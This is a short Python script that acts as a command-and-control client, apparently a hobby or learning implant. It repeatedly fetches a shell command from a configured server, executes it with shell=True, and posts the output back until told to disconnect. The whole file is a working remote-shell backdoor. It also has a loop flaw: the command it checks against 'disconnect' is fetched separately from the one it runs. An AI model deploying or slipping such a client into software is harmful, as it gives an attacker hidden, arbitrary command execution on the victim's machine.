import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5000"

def get_command():
    response = requests.get(f"{SERVER_URL}/get-command") # GET command from server
    if response.status_code == 200: # if request was successful
        cmd = response.json().get('command')
        return cmd
    else:
        return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode('utf-8') + result.stderr.decode('utf-8') # decode standard output
    except subprocess.CalledProcessError as e: # umm uhh
        return str(e)

def main():
    try:
        while get_command() != "disconnect":
            cmd = get_command()
            result = execute_command(cmd) # do it
            requests.post(SERVER_URL, json={"result": result}) # HTTP POST
            time.sleep(10)
        print("disconnected")
        requests.post(SERVER_URL, "client disconnected")
    except:
        print("*crickets*")

if __name__ == "__main__":
    main()